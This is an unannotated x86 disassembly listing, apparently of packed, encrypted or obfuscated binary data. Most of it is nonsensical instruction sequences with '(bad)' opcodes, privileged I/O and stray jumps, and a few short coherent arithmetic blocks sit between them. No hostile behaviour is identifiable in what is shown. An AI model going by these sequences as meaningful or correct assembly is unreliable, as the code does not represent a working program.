  405dd9:	jge    0x405db0
  405ddb:	dec    esp
  405ddc:	push   eax
  405ddd:	sub    BYTE PTR [eax],cl
  405ddf:	pop    es
  405de0:	cmp    bh,0x75
  405de3:	pushf  
  405de4:	sbb    BYTE PTR [edi-0x34d69e44],0x92
  405deb:	clc    
  405dec:	gs stc 
  405dee:	ror    DWORD PTR [edi+0x480a9b17],cl
  405df4:	inc    edi
  405df5:	push   DWORD PTR [ebx+ebp*1+0x7dca2ab6]
  405dfc:	outs   dx,BYTE PTR ds:[esi]
  405dfd:	mov    BYTE PTR [edi+eax*1+0x6b36bfab],ah
  405e04:	std    
  405e05:	cmc    
  405e06:	daa    
  405e07:	xchg   ecx,edx
  405e09:	or     BYTE PTR [esi-0xc],dl
  405e0c:	mov    bl,0xf9
  405e0e:	ins    DWORD PTR es:[edi],dx
  405e0f:	movntps XMMWORD PTR [ebx-0x6979ee76],xmm2
  405e16:	xchg   DWORD PTR [eax+0x3f],esi
  405e19:	xchg   ecx,eax
  405e1a:	inc    esi
  405e1b:	out    dx,al
  405e1c:	dec    ebx
  405e1d:	xchg   ecx,eax
  405e1e:	mov    eax,ss:0x8e136d7e
  405e24:	push   edi
  405e25:	pop    es
  405e26:	gs cwde 
  405e28:	sub    eax,edi
  405e2a:	xchg   DWORD PTR [ebp-0x42],edi
  405e2d:	dec    esi
  405e2e:	das    
  405e2f:	mov    ah,0x6b
  405e31:	jnp    0x405e43
  405e33:	aam    0x67
  405e35:	int    0x54
  405e37:	(bad)  [esi]
  405e3a:	pop    edx
  405e3b:	sub    BYTE PTR [esi-0x351f8548],ch
  405e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e42:	data16 std 
  405e44:	mov    ebp,0xa3a56665
  405e49:	into   
  405e4a:	pop    esi
  405e4b:	scas   eax,DWORD PTR es:[edi]
  405e4c:	xor    DWORD PTR [edx-0x1f490118],edx
  405e52:	leave  
  405e53:	pop    esp
  405e54:	lock or cl,dh
  405e57:	lea    ecx,[edx]
  405e59:	fimul  WORD PTR [ebp-0xa437524]
  405e5f:	pop    ecx
  405e60:	mov    edx,0x72f5c744
  405e65:	leave  
  405e66:	inc    ebx
  405e67:	cmp    bh,dl
  405e69:	mov    esp,0x644dba4f
  405e6e:	jp     0x405e56
  405e70:	popa   
  405e71:	retf   0xc2c0
  405e74:	sbb    cl,BYTE PTR [ebx-0x2e9e3e62]
  405e7a:	mov    dl,0x6a
  405e7c:	xchg   edi,eax
  405e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e7e:	xchg   esi,eax
  405e7f:	sbb    ah,BYTE PTR [edx+0x5ee79272]
  405e85:	out    0xf7,al
  405e87:	cwde   
  405e88:	retf   0xe03d
  405e8b:	add    BYTE PTR [eax],dh
  405e8d:	pop    ds
  405e8e:	inc    esi
  405e8f:	sti    
  405e90:	imul   esp,DWORD PTR [edx-0x58fe06e6],0xffffffd1
  405e97:	mov    eax,0x7514d16c
  405e9c:	dec    ebx
  405e9d:	mov    dl,0x60
  405e9f:	out    dx,eax
  405ea0:	jo     0x405ec5
  405ea2:	add    ebx,DWORD PTR [edi+ebp*1-0x24]
  405ea6:	push   esp
  405ea7:	clc    
  405ea8:	mov    ebp,0xc5277248
  405ead:	sti    
  405eae:	dec    esi
  405eaf:	sbb    esp,DWORD PTR [edx+0x61]
  405eb2:	aas    
  405eb3:	leave  
  405eb4:	scas   eax,DWORD PTR es:[edi]
  405eb5:	or     dl,BYTE PTR [eax-0xe3087]
  405ebb:	cmp    DWORD PTR [esi+0x5c7d14f4],0x8f7a4447
  405ec5:	xor    DWORD PTR [edi],ecx
  405ec7:	dec    eax
  405ec8:	fnstenv [esi]
  405eca:	mov    ebx,0x93a654a3
  405ecf:	dec    ebx
  405ed0:	xchg   BYTE PTR [eax],dh
  405ed2:	xchg   ebp,eax
  405ed3:	ficomp DWORD PTR [edi+0x7]
  405ed6:	pop    ebx
  405ed7:	test   eax,0x5595e600
  405edc:	sub    BYTE PTR [ebp-0x6f],0xb7
  405ee0:	mov    ecx,DWORD PTR ds:0x1071bc4f
  405ee6:	lahf   
  405ee7:	push   cs
  405ee8:	out    0x7e,al
  405eea:	xchg   esp,eax
  405eeb:	add    dl,BYTE PTR [eax]
  405eed:	jne    0x405f04
  405eef:	push   es
  405ef0:	stos   BYTE PTR es:[edi],al
  405ef1:	je     0x405ed9
  405ef3:	xchg   DWORD PTR [eax],esi
  405ef5:	fmul   st(6),st
  405ef7:	out    0x4a,eax
  405ef9:	sbb    al,0x2a
  405efb:	lods   eax,DWORD PTR ds:[esi]
  405efc:	test   eax,0x462ce92
  405f01:	pop    edx
  405f02:	and    al,0x5c
  405f04:	pop    es
  405f05:	add    bl,bl
  405f07:	in     eax,dx
  405f08:	pop    edi
  405f09:	push   ebp
  405f0a:	sub    DWORD PTR [edi],edx
  405f0c:	adc    eax,0x4e94bdfd
  405f11:	mov    al,0x45
  405f13:	popf   
  405f14:	jle    0x405f93
  405f16:	je     0x405ea1
  405f18:	sahf   
  405f19:	adc    ebp,DWORD PTR [esi+0x36]
  405f1c:	mov    edx,0x7b13701b
  405f21:	je     0x405f09
  405f23:	pop    ecx
  405f24:	test   eax,0xb674e23b
  405f29:	jp     0x405edb
  405f2b:	xchg   ebx,eax
  405f2c:	gs fstp st(5)
  405f2f:	or     bl,bl
  405f31:	mov    ds:0xd9e76496,eax
  405f36:	jbe    0x405fa8
  405f38:	sbb    dh,bl
  405f3a:	and    al,BYTE PTR [eax+ecx*2-0x2b]
  405f3e:	(bad)  
  405f3f:	into   
  405f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f41:	push   esp
  405f42:	xchg   edi,eax
  405f43:	aam    0x55
  405f45:	dec    esi
  405f46:	imul   edx,ebp,0x1b78474b
  405f4c:	daa    
  405f4d:	sti    
  405f4e:	lock push ss
  405f50:	pop    ds
  405f51:	fwait
  405f52:	push   ebp
  405f53:	cmp    al,0xa9
  405f55:	rcr    DWORD PTR [edx-0x63],0x24
  405f59:	mov    ah,0x7d
  405f5b:	mov    fs,WORD PTR [ebx]
  405f5d:	xchg   ecx,eax
  405f5e:	or     al,0xa2
  405f60:	fdiv   st(5),st
  405f62:	xor    dh,0xb4
  405f65:	or     al,0x48
  405f67:	and    edi,ebx
  405f69:	fstp   DWORD PTR [esi-0x76]
  405f6c:	fist   WORD PTR [ecx+0x70]
  405f6f:	push   cs
  405f70:	popf   
  405f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f72:	xchg   BYTE PTR [ebp-0x7bb891ef],cl
  405f78:	sbb    eax,0xf05b8555
  405f7d:	xor    ch,BYTE PTR [edi]
  405f7f:	or     al,ah
  405f81:	gs xchg ebp,eax
  405f83:	test   DWORD PTR [ebx+edx*4],esi
  405f86:	inc    ebx
  405f87:	jb     0x405f54
  405f89:	cmp    eax,0xbeb4df0
  405f8e:	inc    eax
  405f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f90:	mov    edi,0x22dffed5
  405f95:	stc    
  405f96:	push   es
  405f97:	repnz mov edx,0x3c8822bf
  405f9d:	shl    BYTE PTR [ebp*2+0x3b34a340],cl
  405fa4:	popf   
  405fa5:	jbe    0x405ffc
  405fa7:	js     0x405fa7
  405fa9:	mov    ds:0xd8c04d66,eax
  405fae:	jnp    0x405f3d
  405fb0:	and    DWORD PTR [ebp-0x46c9a1ad],ebx
  405fb6:	sbb    eax,0x43de51f6
  405fbb:	inc    ebp
  405fbc:	sub    bh,bh
  405fbe:	loopne 0x405ffd
  405fc0:	sbb    DWORD PTR [eax+0xb],edi
  405fc3:	cmp    bl,bh
  405fc5:	in     al,dx
  405fc6:	call   0xed838c93
  405fcb:	xchg   edx,eax
  405fcc:	outs   dx,DWORD PTR ds:[esi]
  405fcd:	sub    esp,DWORD PTR [eax-0x48]
  405fd0:	dec    ecx
  405fd1:	jbe    0x405f61
  405fd3:	daa    
  405fd4:	scas   al,BYTE PTR es:[edi]
  405fd5:	push   es
  405fd6:	mov    bl,0xf2
  405fd8:	ret    0xef23
  405fdb:	stos   BYTE PTR es:[edi],al
  405fdc:	shld   edi,esi,cl
  405fdf:	inc    esp
  405fe0:	sbb    edi,DWORD PTR [ebx+0x131ba1e7]
  405fe6:	pop    ss
  405fe7:	pop    es
  405fe8:	sbb    esp,ecx
  405fea:	add    dh,BYTE PTR [eax+0x78]
  405fed:	xchg   BYTE PTR ds:0xb0113ab2,dl
  405ff3:	xchg   ecx,esi
  405ff5:	test   al,0xb8
  405ff7:	dec    ebp
  405ff8:	popa   
  405ff9:	sahf   
  405ffa:	shl    DWORD PTR [esi-0x15],0x3c
  405ffe:	lea    ebx,[ecx]
  406000:	test   BYTE PTR [ecx-0x54afae97],dh
  406006:	mov    ds:0xda2b025f,eax
  40600b:	aas    
  40600c:	xchg   dh,bh
  40600e:	test   eax,0x7c7702c6
  406013:	pop    edx
  406014:	dec    edx
  406015:	dec    ebp
  406016:	and    esp,DWORD PTR [esi+ebp*8]
  406019:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40601b:	nop
  40601c:	test   edi,0x3a5dcfa8
  406022:	ins    DWORD PTR es:[edi],dx
  406023:	pop    DWORD PTR [eax-0x7630bf24]
  406029:	adc    ecx,DWORD PTR [eax+edi*2]
  40602c:	cmp    al,0xe6
  40602e:	mov    esi,0xe00de72e
  406033:	adc    DWORD PTR [esi+ecx*4],eax
  406036:	xchg   ebx,esp
  406038:	pop    es
  406039:	js     0x405ff6
  40603b:	(bad)  
  40603c:	mov    esi,DWORD PTR [edx]
  40603e:	loopne 0x406008
  406040:	aam    0x80
  406042:	and    DWORD PTR [ebx],0x587cc14f
  406048:	push   ecx
  406049:	add    bl,BYTE PTR [ebx-0x29912d55]
  40604f:	pop    ds
  406050:	int3   
  406051:	jmp    0x4de6f30e
  406056:	sbb    BYTE PTR [esp+edi*8+0x75],ah
  40605a:	pop    ebx
  40605b:	cmp    al,0x62
  40605d:	or     edx,DWORD PTR [ebx]
  40605f:	pop    DWORD PTR [edi+0xf]
  406062:	out    0xb8,eax
  406064:	cmp    al,0xd4
  406066:	xchg   esi,eax
  406067:	adc    al,0xc9
  406069:	dec    ebx
  40606a:	ins    DWORD PTR es:[edi],dx
  40606b:	xchg   ebp,eax
  40606c:	int    0x5
  40606e:	pop    esi
  40606f:	sub    eax,DWORD PTR [edi-0x522e7d35]
  406075:	popf   
  406076:	js     0x406058
  406078:	rcl    BYTE PTR [edx],1
  40607a:	sub    esp,DWORD PTR [edi-0x14cb3d59]
  406080:	inc    ecx
  406081:	mov    cs,WORD PTR [di+0x6]
  406085:	push   ecx
  406086:	add    al,0xc2
  406088:	pavgw  mm0,QWORD PTR [edi+0x67]
  40608c:	cs jmp 0x406018
  40608f:	fld    DWORD PTR [esi-0x6c17743c]
  406095:	fadd   st,st(1)
  406097:	mov    eax,0xb9ee9ce7
  40609c:	cld    
  40609d:	loope  0x406039
  40609f:	stc    
  4060a0:	imul   esi,DWORD PTR [edx-0x15],0x5212f979
  4060a7:	ror    DWORD PTR ds:0x34b23455,1
  4060ad:	xlat   BYTE PTR ds:[ebx]
  4060ae:	sub    cl,BYTE PTR [edx]
  4060b0:	push   esi
  4060b1:	xchg   esi,eax
  4060b2:	ret    0x81bf
  4060b5:	mov    ch,0xe4
  4060b7:	scas   al,BYTE PTR es:[edi]
  4060b8:	xchg   edx,eax
  4060b9:	out    0x90,al
  4060bb:	cmp    DWORD PTR [ebx+0x4d],edi
  4060be:	icebp  
  4060bf:	jne    0x406128
  4060c1:	pop    ss
  4060c2:	shr    DWORD PTR [ecx+0x1c],cl
  4060c5:	add    DWORD PTR [esi],0x295cf273
  4060cb:	sub    al,0x33
  4060cd:	mov    si,WORD PTR [ecx+0x10]
  4060d1:	jbe    0x40614a
  4060d3:	ret    
  4060d4:	sbb    esi,DWORD PTR [esi]
  4060d6:	fwait
  4060d7:	push   ecx
  4060d8:	loope  0x4060d9
  4060da:	cs outs dx,DWORD PTR es:[esi]
  4060dd:	jmp    0x4060ca
  4060df:	mov    bl,al
  4060e1:	dec    ebx
  4060e2:	mov    ecx,0xf6fd306
  4060e7:	sub    eax,0xf0877bc1
  4060ec:	cld    
  4060ed:	and    eax,0x1801f51a
  4060f2:	cmp    al,0xca
  4060f4:	shl    DWORD PTR [eax],1
  4060f6:	loop   0x406085
  4060f8:	inc    esp
  4060f9:	add    eax,0xcc4589fc
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	push   cs
  40612d:	add    al,0x14
  40612f:	stos   BYTE PTR es:[edi],al
  406130:	js     0x4060d5
  406132:	sbb    BYTE PTR [eax],bl
  406134:	sahf   
  406135:	adc    bl,BYTE PTR [eax]
  406137:	sbb    BYTE PTR [eax-0x27d60354],ch
  40613d:	in     eax,0xc6
  40613f:	repnz cmp DWORD PTR [edx+0x5b],edx
  406143:	cmp    eax,0x3ddee323
  406148:	adc    dl,BYTE PTR [ebx+0x21]
  40614b:	jge    0x406185
  40614d:	xor    ebp,edx
  40614f:	out    dx,eax
  406150:	mov    eax,0x21978e67
  406155:	mov    ebx,0x38928a71
  40615a:	lock jne 0x4061a1
  40615d:	pop    ss
  40615e:	and    DWORD PTR [ebx],ebp
  406160:	mov    bl,0xf2
  406162:	outs   dx,DWORD PTR ds:[esi]
  406163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406164:	mov    eax,ds:0x8805f6e
  406169:	add    esp,DWORD PTR [esi+edx*4-0x2040f932]
  406170:	rol    BYTE PTR [esi-0x54],0x35
  406174:	out    dx,al
  406175:	in     eax,0x60
  406177:	or     eax,0x6061ce8a
  40617c:	lock fldenv [eax]
  40617f:	in     eax,0x73
  406181:	fdiv   QWORD PTR ds:0x922b2326
  406187:	adc    DWORD PTR [eax],0xcb655924
  40618d:	push   eax
  40618e:	sub    dl,BYTE PTR [esi+ebp*8]
  406191:	cld    
  406192:	test   ebx,0xa303c322
  406198:	and    esp,DWORD PTR [edi]
  40619a:	pop    ds
  40619b:	mov    edx,0x7b9cca33
  4061a0:	xchg   al,ch
  4061a2:	(bad)  
  4061a3:	out    0x39,eax
  4061a5:	rcl    BYTE PTR [ecx+0x2b0f050e],1
  4061ab:	xchg   ecx,eax
  4061ac:	ins    DWORD PTR es:[edi],dx
  4061ad:	cmc    
  4061ae:	in     al,0x8a
  4061b0:	test   BYTE PTR [ebp-0xd],0x45
  4061b4:	cmp    ecx,DWORD PTR [ebx-0x4]
  4061b7:	out    0x8d,eax
  4061b9:	mov    esp,0x1dfe3527
  4061be:	add    eax,DWORD PTR [eax+edi*1-0x391797ca]
  4061c5:	mov    bh,0x3b
  4061c7:	or     DWORD PTR [ecx],edx
  4061c9:	(bad)  
  4061cb:	jge    0x406165
  4061cd:	sysenter 
  4061cf:	in     eax,dx
  4061d0:	sub    DWORD PTR [edi+0x25b1785b],0xd
  4061d7:	jg     0x406249
  4061d9:	call   0x28965e55
  4061de:	popa   
  4061df:	in     eax,dx
  4061e0:	jns    0x406221
  4061e2:	call   0x3b55:0x3a6fb3a0
  4061e9:	adc    bh,bl
  4061eb:	(bad)  
  4061ec:	fdivr  QWORD PTR [esi]
  4061ee:	jge    0x406252
  4061f0:	bound  esi,QWORD PTR [ecx-0xa18b340]
  4061f6:	xlat   BYTE PTR ds:[ebx]
  4061f7:	jmp    0x4061a1
  4061f9:	add    DWORD PTR [ebp-0x7bed27a8],ecx
  4061ff:	sbb    DWORD PTR [edi-0x4a],ebx
  406202:	ss pop edx
  406204:	aas    
  406205:	or     eax,0xe1d64ac0
  40620a:	popa   
  40620b:	scas   eax,DWORD PTR es:[edi]
  40620c:	jmp    0x40624b
  40620e:	sbb    bh,ch
  406210:	loopne 0x406261
  406212:	inc    ecx
  406213:	loop   0x406222
  406215:	add    al,0xe
  406217:	push   0x131a71e1
  40621c:	pop    es
  40621d:	xor    BYTE PTR [edi+0x47],al
  406220:	sub    edi,DWORD PTR [edi-0x1e]
  406223:	retf   0x1ce9
  406226:	pop    eax
  406227:	and    BYTE PTR [esi],al
  406229:	inc    esi
  40622a:	test   BYTE PTR [ebp+0x48],0xa5
  40622e:	pop    ecx
  40622f:	cmp    eax,0x8d6fd15a
  406234:	adc    al,0xde
  406236:	cmp    ebp,DWORD PTR [ecx-0xd]
  406239:	pop    es
  40623a:	shl    BYTE PTR [edi+0x71eef617],0xd2
  406241:	in     eax,0xf0
  406243:	fsub   QWORD PTR [ecx-0x15]
  406246:	jnp    0x406204
  406248:	jne    0x40621f
  40624a:	jg     0x406287
  40624c:	xor    dl,bl
  40624e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40624f:	jmp    0x406263
  406251:	sbb    BYTE PTR [ebp-0x47264a8],0xaa
  406258:	sub    ch,al
  40625a:	div    DWORD PTR [edx-0x75]
  40625d:	add    eax,0x1152fa9c
  406262:	cmp    BYTE PTR [edi+0x64],ah
  406265:	inc    esi
  406266:	repz sbb BYTE PTR [eax+edx*1+0x75],ch
  40626b:	out    dx,al
  40626c:	jno    0x4062de
  40626e:	sbb    BYTE PTR [ebp-0x24],bl
  406271:	mov    eax,ds:0x6aeef4f9
  406276:	pushf  
  406277:	stc    
  406278:	mov    edi,0xfc45b06e
  40627d:	push   0x15ce2da2
  406282:	sub    al,0xfd
  406284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406285:	retf   0x2dde
  406288:	push   esi
  406289:	or     edx,DWORD PTR [ecx+0x475c8412]
  40628f:	test   eax,0x772dbf2b
  406294:	add    al,0x27
  406296:	inc    ebx
  406297:	fcmovnb st,st(0)
  406299:	loop   0x406240
  40629b:	xor    BYTE PTR [esi-0x5306a6f0],bl
  4062a1:	inc    esi
  4062a2:	push   esp
  4062a3:	xor    al,0x3
  4062a5:	mov    ebp,0x9173d6d1
  4062aa:	das    
  4062ab:	in     al,0x30
  4062ad:	and    ebx,DWORD PTR [ecx]
  4062af:	sub    al,0x5a
  4062b1:	or     al,0x57
  4062b3:	dec    ebp
  4062b4:	fnstenv [ebx+ebx*4]
  4062b7:	dec    eax
  4062b8:	dec    esp
  4062b9:	push   0x6
  4062bb:	lods   al,BYTE PTR ds:[esi]
  4062bc:	xor    esi,DWORD PTR [edx-0x5f]
  4062bf:	std    
  4062c0:	lods   al,BYTE PTR ds:[esi]
  4062c1:	push   ss
  4062c2:	dec    esp
  4062c3:	(bad)  
  4062c4:	push   eax
  4062c5:	jg     0x406251
  4062c7:	xchg   ebx,eax
  4062c8:	xchg   ebx,eax
  4062c9:	leave  
  4062ca:	sub    ch,dl
  4062cc:	rcr    BYTE PTR [ebx],cl
  4062ce:	data16 mov BYTE PTR [ebx],al
  4062d1:	xchg   esi,eax
  4062d2:	and    BYTE PTR [eax+0x9],0x9
  4062d6:	cwde   
  4062d7:	mov    ecx,0x419eaaf3
  4062dc:	hlt    
  4062dd:	ror    edx,1
  4062df:	mov    edi,0xc60dc905
  4062e4:	lea    ebp,[ebp-0x7c]
  4062e7:	cmp    bl,BYTE PTR [ebx+0x314e7a1]
  4062ed:	pop    ebx
  4062ee:	stc    
  4062ef:	jp     0x4062a5
  4062f1:	sub    DWORD PTR [esi],edx
  4062f3:	ds (bad) 
  4062f5:	lods   eax,DWORD PTR ds:[esi]
  4062f6:	push   es
  4062f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062f8:	mov    DWORD PTR [ecx+0x39],edx
  4062fb:	aas    
  4062fc:	popa   
  4062fd:	dec    edi
  4062fe:	xrelease xchg DWORD PTR [eax],esp
  406301:	dec    edx
  406302:	sahf   
  406303:	or     eax,0x693e7450
  406308:	adc    al,0xe2
  40630a:	pop    edi
  40630b:	ds test al,0x2d
  40630e:	pop    ss
  40630f:	mov    al,0x72
  406311:	push   ecx
  406312:	shl    DWORD PTR [esi-0x2e9fdfa9],0x3f
  406319:	aam    0xa2
  40631b:	and    eax,0x6c1b32b1
  406320:	add    al,dh
  406322:	mov    esp,0xb289a9c8
  406327:	cdq    
  406328:	fistp  QWORD PTR [eax+0x18]
  40632b:	inc    ecx
  40632c:	jo     0x40638d
  40632e:	inc    edi
  40632f:	fcos   
  406331:	enter  0x978e,0x67
  406335:	and    DWORD PTR [edi-0x2a310d5b],ebx
  40633b:	jne    0x4062f5
  40633d:	test   al,0xb7
  40633f:	inc    ecx
  406340:	ja     0x40639f
  406342:	mov    esi,0x39822b4d
  406347:	ror    DWORD PTR [edx],1
  406349:	sbb    esp,0x17
  40634c:	mov    edx,0x7dc900b5
  406351:	repnz dec ebp
  406353:	enter  0x8316,0x9d
  406357:	sbb    esp,esi
  406359:	outs   dx,BYTE PTR ds:[esi]
  40635a:	es jmp 0x1e8ea503
  406360:	or     BYTE PTR [eax],ah
  406362:	mov    ebx,0x63f3febb
  406367:	ds mov ecx,0x805757f6
  40636d:	in     al,dx
  40636e:	shl    BYTE PTR [ebp+0x60],0x1c
  406372:	xchg   edi,eax
  406373:	jg     0x406322
  406375:	js     0x40636d
  406377:	popf   
  406378:	xor    cl,dh
  40637a:	mov    dl,0xbe
  40637c:	leave  
  40637d:	xchg   edi,eax
  40637e:	xor    al,0xa7
  406380:	xor    bh,cl
  406382:	push   ss
  406383:	dec    ecx
  406384:	add    ch,BYTE PTR [edi+0x59]
  406387:	fldcw  WORD PTR [esi+0x69]
  40638a:	jge    0x40634b
  40638c:	xchg   edx,eax
  40638d:	mov    ds:0xa6fc8464,al
  406392:	out    dx,eax
  406393:	arpl   WORD PTR [esi+0x41],ax
  406396:	js     0x4063b5
  406398:	adc    ecx,DWORD PTR [edi+0x24e31975]
  40639e:	fild   QWORD PTR [esp+eax*1-0x4f1c9c14]
  4063a5:	call   0x178b:0x3d7c032c
  4063ac:	mov    edi,0x2bcce247
  4063b1:	nop
  4063b2:	push   es
  4063b3:	pop    es
  4063b4:	test   DWORD PTR [eax],0xcc3add7e
  4063ba:	xchg   edx,eax
  4063bb:	jp     0x406434
  4063bd:	loop   0x406361
  4063bf:	push   edx
  4063c0:	fst    st(3)
  4063c2:	shl    DWORD PTR [edi],0x3f
  4063c5:	std    
  4063c6:	cld    
  4063c7:	add    edi,DWORD PTR [esi+0x674cd365]
  4063cd:	mov    dl,0x1a
  4063cf:	and    DWORD PTR [ebx+0x5c02b7c7],edi
  4063d5:	pushf  
  4063d6:	and    bh,BYTE PTR [esi]
  4063d8:	or     BYTE PTR [esi-0x568ecfaa],ch
  4063de:	scas   al,BYTE PTR es:[edi]
  4063df:	popa   
  4063e0:	inc    edi
  4063e1:	sub    BYTE PTR [ebx+esi*2-0x3c],ch
  4063e5:	mov    WORD PTR [esp],?
  4063e8:	(bad)  [ebx+0xda4cc85]
  4063ee:	sti    
  4063ef:	popf   
  4063f0:	pop    eax
  4063f1:	imul   ebx,DWORD PTR [ecx-0xfafd70],0xfffffff4
  4063f8:	popa   
  4063f9:	sbb    BYTE PTR [edi-0x48e544eb],ah
  4063ff:	enter  0x4e4,0x2b
  406403:	shr    BYTE PTR [ebx-0x62],0xd8
  406407:	repnz add bh,BYTE PTR [esp+edx*1+0x6e08558]
  40640f:	test   al,0x2e
  406411:	lock sbb ecx,DWORD PTR [edx]
  406414:	out    0xf5,eax
  406416:	ja     0x4063cd
  406418:	ret    0x195d
  40641b:	dec    eax
  40641c:	retfw  0xdc25
  406420:	mov    DWORD PTR [esi],edx
  406422:	mov    ds:0xcdc586ed,eax
  406427:	movzx  esi,WORD PTR [ebx]
  40642a:	mov    ch,0x39
  40642c:	jp     0x4063af
  40642e:	retf   
  40642f:	sub    dh,bl
  406431:	xchg   ebp,eax
  406432:	mov    bl,0x28
  406434:	cmp    eax,0xde5636b7
  406439:	std    
  40643a:	cdq    
  40643b:	adc    eax,0x846cc0ec
  406440:	adc    ebp,eax
  406442:	mov    ch,BYTE PTR [esi-0xb]
  406445:	xor    dl,dh
  406447:	in     al,0x67
  406449:	dec    eax
  40644a:	test   DWORD PTR [eax-0x3d43db8d],ebx
  406450:	pop    esi
  406451:	adc    ebp,DWORD PTR [ebx-0x7a]
  406454:	ret    0x499d
  406457:	jecxz  0x40647a
  406459:	xchg   edx,eax
  40645a:	bound  esp,QWORD PTR [edx+ebx*4+0x1485cdf8]
  406461:	les    edi,FWORD PTR [edx]
  406463:	lods   eax,DWORD PTR ds:[esi]
  406464:	cmc    
  406465:	scas   al,BYTE PTR es:[edi]
  406466:	fldenv [eax]
  406468:	cmp    dl,BYTE PTR [eax+ebp*1]
  40646b:	and    ebx,DWORD PTR ds:0x6baa39cc
  406471:	xchg   esi,eax
  406472:	sub    dh,dh
  406474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406475:	sbb    al,0x94
  406477:	mov    cl,0x59
  406479:	(bad)  
  40647b:	dec    edi
  40647c:	test   BYTE PTR [edx-0x7c],ch
  40647f:	cmp    BYTE PTR [ebp+0x156111b2],ah
  406485:	stos   DWORD PTR es:[edi],eax
  406486:	lock mov esp,0x3cd54e0a
  40648c:	xor    eax,DWORD PTR ds:0xc4198cb4
  406492:	mov    esp,0xfb9fcf18
  406497:	cmp    al,0x54
  406499:	cmc    
  40649a:	gs in  al,dx
  40649c:	add    al,BYTE PTR [ecx+0x73]
  40649f:	mov    bh,0x86
  4064a1:	cmp    al,0x44
  4064a3:	push   cs
  4064a4:	dec    edx
  4064a5:	bound  eax,QWORD PTR ds:0xd9af78d2
  4064ab:	push   ss
  4064ac:	cwde   
  4064ad:	enter  0xffb6,0x90
  4064b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b2:	test   DWORD PTR [esi-0x332f7fe0],edx
  4064b8:	push   esi
  4064b9:	test   al,0x8
  4064bb:	add    DWORD PTR [ebx-0x6f],edx
  4064be:	popf   
  4064bf:	xor    dh,BYTE PTR [edx]
  4064c1:	div    DWORD PTR [edx+0x49]
  4064c4:	loope  0x406495
  4064c6:	or     ecx,DWORD PTR [edx-0x5756b1d8]
  4064cc:	fsub   DWORD PTR [eax-0x54]
  4064cf:	clc    
  4064d0:	or     ebp,DWORD PTR fs:[edx-0x3fa3b33e]
  4064d7:	loop   0x4064da
  4064d9:	jbe    0x406524
  4064db:	xor    ecx,edi
  4064dd:	jge    0x406534
  4064df:	in     al,dx
  4064e0:	jge    0x406499
  4064e2:	popa   
  4064e3:	xchg   ecx,eax
  4064e4:	inc    edx
  4064e5:	test   eax,0xf67355ae
  4064ea:	arpl   WORD PTR [eax-0x7e],ax
  4064ed:	cmp    ecx,DWORD PTR [esi-0x28ff1762]
  4064f3:	push   cs
  4064f4:	sub    ebp,DWORD PTR [esi+0x10]
  4064f7:	inc    edx
  4064f8:	jle    0x406505
  4064fa:	ret    0xc8a
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x5518e7dd],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	cdq    
  406557:	ficom  DWORD PTR [ebp+0x29]
  40655a:	int3   
  40655b:	imul   edi,edi,0xb0736ee2
  406561:	out    dx,eax
  406562:	mov    cl,0x77
  406564:	cmp    al,0x83
  406566:	sbb    DWORD PTR [edx-0x68],esp
  406569:	fisttp WORD PTR [eax+0x71]
  40656c:	add    al,0x5c
  40656e:	xchg   esp,eax
  40656f:	in     al,dx
  406570:	(bad)  
  406571:	xchg   edi,eax
  406572:	pushf  
  406573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406574:	mov    ecx,0xc00844ce
  406579:	sbb    al,0xb8
  40657b:	stos   DWORD PTR es:[edi],eax
  40657c:	xchg   esi,eax
  40657d:	(bad)  
  40657e:	fmulp  st(0),st
  406580:	mov    edi,0x2de38851
  406585:	mov    ebx,0xa4353039
  40658a:	ss cmp ebx,ecx
  40658d:	retf   
  40658e:	xor    eax,0x97fe7d70
  406593:	xor    esi,ebp
  406595:	ret    0x7e95
  406598:	daa    
  406599:	mov    ebx,0x4021d4e6
  40659e:	ds sub eax,0x96ace0c5
  4065a4:	(bad)  
